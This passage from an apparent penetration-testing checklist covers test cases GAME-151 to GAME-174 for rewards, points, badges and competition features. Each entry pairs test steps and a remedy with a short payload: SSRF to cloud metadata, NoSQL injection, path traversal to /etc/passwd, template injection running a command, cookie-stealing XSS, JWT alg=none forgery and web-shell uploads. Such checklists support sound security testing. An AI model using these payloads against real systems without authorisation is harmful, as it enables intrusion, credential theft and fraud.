**Expected Result:** Application must verify ownership before displaying redemption history and protect redemption codes from unauthorized access.

**Payload Example:**

```
GET /api/rewards/history?user_id=1002;GET /api/users/1002/redemptions with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## GAME-151 — Reward Cancellation and Re-Redemption
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Redeem a reward. 2. Cancel the redemption and receive points back. 3. Use the reward code before cancellation takes effect. 4. Check for double benefit.

**Expected Result:** Application must immediately invalidate reward codes upon cancellation and process cancellation atomically with point refund.

**Payload Example:**

```
Redeem reward;capture code;cancel redemption;use captured code;check if both points refund and code usage succeed
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-152 — Points Webhook Manipulation
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. If points system uses webhooks for external integrations check for SSRF. 2. Modify webhook URLs. 3. Attempt to access internal services.

**Expected Result:** Application must validate webhook URLs against an allowlist and prevent access to internal network addresses.

**Payload Example:**

```
points_webhook=http://169.254.169.254/latest/meta-data/;callback=http://localhost:6379/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## GAME-153 — Points System NoSQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. If backend uses NoSQL inject NoSQL operators in points query parameters. 2. Check for data extraction or authentication bypass.

**Expected Result:** Application must sanitize all inputs for NoSQL injection patterns and use parameterized queries.

**Payload Example:**

```
GET /api/points?user_id[$ne]=null;GET /api/points/balance?amount[$gt]=0;{"points":{"$gt":0}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** Burp Suite;NoSQLMap

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## GAME-154 — Badge Achievement Webhook Spoofing
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. If badge achievement triggers webhooks to external services attempt to spoof the webhook. 2. Send fake achievement notifications. 3. Check for webhook authentication.

**Expected Result:** Application must authenticate all outgoing webhooks and verify incoming webhook authenticity before processing badge-related events.

**Payload Example:**

```
POST fake webhook to /api/webhooks/badge-earned with spoofed badge_id and user_id
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-155 — Tier Privilege Caching Exploit
**Test Category:** Caching (WSTG-ATHN-06) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Levels / Tiers

**Test Steps:** 1. Achieve a temporary high tier. 2. Check if tier benefits are cached. 3. Downgrade and check if cached tier benefits persist. 4. Test cache TTL for tier data.

**Expected Result:** Application must validate tier privileges in real-time and not rely on cached tier data for access control decisions.

**Payload Example:**

```
Achieve platinum tier;wait for downgrade;check if cached tier=platinum still grants premium features
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## GAME-156 — Leaderboard API GraphQL Abuse
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Leaderboards

**Test Steps:** 1. If leaderboard uses GraphQL craft deeply nested queries. 2. Request excessive user data through leaderboard relationships. 3. Check for query depth limits.

**Expected Result:** Application must implement query depth limiting and field-level authorization for leaderboard GraphQL queries.

**Payload Example:**

```
{leaderboard{entries{user{id;email;password;addresses{street;city};orders{total;items}}}}}
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** Burp Suite;InQL;GraphQL Voyager

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## GAME-157 — Challenge Proof Submission File Upload Vulnerability
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. If challenges require proof submission upload malicious files as proof. 2. Upload web shells disguised as images. 3. Check file validation and access controls.

**Expected Result:** Application must validate proof uploads by content type and scan for malware and store securely.

**Payload Example:**

```
Upload shell.php.jpg;proof.svg with embedded JavaScript;polyglot file as challenge proof
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## GAME-158 — Daily Reward Notification Spam
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Daily Rewards

**Test Steps:** 1. If daily rewards trigger notifications attempt to trigger excessive notifications. 2. Manipulate claim status to re-trigger notifications. 3. Check for notification rate limiting.

**Expected Result:** Application must implement notification rate limiting and prevent duplicate reward notifications through status manipulation.

**Payload Example:**

```
Toggle daily reward claim status repeatedly to generate spam notifications
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## GAME-159 — Streak Cross-Platform Synchronization Exploit
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Streaks

**Test Steps:** 1. If streaks sync across platforms log activity on one platform. 2. Intercept sync request. 3. Modify synced streak data. 4. Check if inflated streak is accepted on other platform.

**Expected Result:** Application must validate synced streak data against actual platform-specific activity records and not blindly accept cross-platform sync data.

**Payload Example:**

```
Modify sync payload to inflate streak_count;change last_activity_date in cross-platform sync
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-160 — Referral Program Circular Referral Detection Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Referral Program

**Test Steps:** 1. Create two accounts. 2. Use Account A's referral for Account B. 3. Use Account B's referral for Account A. 4. Check if circular referral bonuses are detected and prevented.

**Expected Result:** Application must detect and prevent circular referral patterns and limit referral depth.

**Payload Example:**

```
Create A->B->A referral chain;test A->B->C->A circular chain;check for detection mechanisms
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Custom Scripts;Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## GAME-161 — Loyalty Program Expiry Notification Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. Check loyalty points expiry notifications. 2. Intercept and modify expiry dates in notifications. 3. Check if manipulated expiry dates prevent actual point expiration.

**Expected Result:** Application must process loyalty point expiry server-side regardless of notification status and not trust client-acknowledged expiry dates.

**Payload Example:**

```
Modify expiry_notification response to extend expiry_date;block expiry notification and check if points expire
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-162 — Progress Data Export Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Progress Tracking

**Test Steps:** 1. If progress data can be exported modify the export file path. 2. Attempt directory traversal. 3. Check if arbitrary files can be accessed through the export feature.

**Expected Result:** Application must validate export file paths and prevent directory traversal in progress data export functionality.

**Payload Example:**

```
GET /api/progress/export?file=../../../etc/passwd;export_path=....//....//app/config/secrets.yml
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## GAME-163 — Milestone Notification SSTI
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Milestones

**Test Steps:** 1. If milestone names or descriptions are user-influenced inject SSTI payloads. 2. Trigger milestone notification. 3. Check if template engine evaluates the expression.

**Expected Result:** Application must escape template syntax in all user-influenced milestone data before rendering in notifications.

**Payload Example:**

```
milestone_name={{7*7}};milestone_desc=${Runtime.getRuntime().exec('id')}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## GAME-164 — Competition API Authentication Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. Access competition endpoints without authentication. 2. Remove or modify authentication tokens. 3. Check if competition data or entry functionality is accessible without valid credentials.

**Expected Result:** Application must require valid authentication for all competition endpoints including viewing entries and submitting scores.

**Payload Example:**

```
Remove Authorization header from GET /api/competitions/COMP-001/entries;POST /api/competitions/submit without auth
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## GAME-165 — Reward Delivery Channel Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Redeem a reward. 2. Intercept and change the delivery channel from in-app to email. 3. Modify delivery_email to attacker's email. 4. Check if reward is sent to unauthorized email.

**Expected Result:** Application must validate delivery channels and addresses against the authenticated user's verified information.

**Payload Example:**

```
Change delivery_email=user@test.com to delivery_email=attacker@evil.com in redemption request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-166 — Social Platform Verification Bypass
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. Share content to earn incentive. 2. Delete the social media post immediately after verification. 3. Check if the incentive remains. 4. Test post-deletion monitoring.

**Expected Result:** Application must implement delayed or periodic social share verification and consider revoking incentives for deleted shares.

**Payload Example:**

```
Share content;immediately delete social post;check if share incentive points remain credited
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Social Media APIs

**References:** CWE-840; PortSwigger Business logic

---

## GAME-167 — Social Share Count Inflation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Social Sharing Incentives

**Test Steps:** 1. If share counts are tracked intercept the share count update. 2. Inflate share_count parameter. 3. Check if inflated counts trigger additional rewards or achievements.

**Expected Result:** Application must track share counts server-side through verified social platform callbacks and not accept client-provided counts.

**Payload Example:**

```
Change share_count=1 to share_count=1000 in POST /api/social-share/track
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-168 — JWT Token Manipulation for Points Access
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Decode the JWT token. 2. Modify user_id or points_balance claims. 3. Change algorithm to none. 4. Submit with tampered token to points endpoints.

**Expected Result:** Application must validate JWT signatures server-side and derive user identity from validated tokens not client claims.

**Payload Example:**

```
Modify JWT alg=none;change sub=admin;modify points_balance claim in JWT payload
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** Burp Suite;jwt_tool

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## GAME-169 — Points System Event Source Spoofing
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Points / Credits System

**Test Steps:** 1. Identify events that trigger points earning. 2. Spoof event sources by directly calling internal event endpoints. 3. Check if points are credited for spoofed events.

**Expected Result:** Application must validate event sources and authenticate internal event triggers to prevent points crediting from spoofed events.

**Payload Example:**

```
POST /api/events/purchase_completed with spoofed event data to trigger points without actual purchase
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## GAME-170 — Badge Display Clickjacking
**Test Category:** Clickjacking (WSTG-CLNT-09) · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Badges / Achievements

**Test Steps:** 1. If badge display page has actions like share or claim create an iframe overlay. 2. Trick users into clicking invisible actions on badge pages. 3. Check for framing protection.

**Expected Result:** Application must implement X-Frame-Options and CSP frame-ancestors to prevent badge pages from being framed.

**Payload Example:**

```
<iframe src='https://target.com/badges/claim/BADGE-001' style='opacity:0'></iframe> with overlay click targets
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite;Browser

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## GAME-171 — Challenge Leaderboard Manipulation via Proxy
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Challenges / Quests

**Test Steps:** 1. If challenges have competitive leaderboards intercept score submissions through proxy. 2. Replay successful challenge completions. 3. Modify completion metrics.

**Expected Result:** Application must validate challenge completions end-to-end and detect replayed or manipulated submission data.

**Payload Example:**

```
Replay captured successful challenge completion request with modified metrics;submit pre-recorded valid response
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## GAME-172 — Reward System Mass Assignment for Free Items
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Rewards Redemption

**Test Steps:** 1. Redeem a reward. 2. Add hidden parameters like points_cost=0 or is_free=true or admin_comp=true. 3. Check if unauthorized fields are processed allowing free redemptions.

**Expected Result:** Application must whitelist allowed redemption parameters and calculate all costs server-side ignoring unauthorized fields.

**Payload Example:**

```
Add points_cost=0&is_free=true&comp_code=ADMIN&override=true to POST /api/rewards/redeem body
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## GAME-173 — Loyalty Program XSS via Membership Card Display
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Loyalty Program

**Test Steps:** 1. If loyalty program generates virtual membership cards inject XSS in card display fields. 2. View the membership card page. 3. Check for script execution.

**Expected Result:** Application must sanitize all data rendered on loyalty membership card displays.

**Payload Example:**

```
member_name=<script>alert(document.cookie)</script>;tier_label=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## GAME-174 — Competition SSRF via External Scoring Service
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Competitions

**Test Steps:** 1. If competitions integrate with external scoring services check for SSRF. 2. Modify scoring service URLs. 3. Attempt to access internal services through competition scoring integration.

**Expected Result:** Application must validate and whitelist external scoring service URLs and prevent SSRF through competition integrations.

**Payload Example:**

```
scoring_service_url=http://169.254.169.254/latest/meta-data/;validation_endpoint=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---
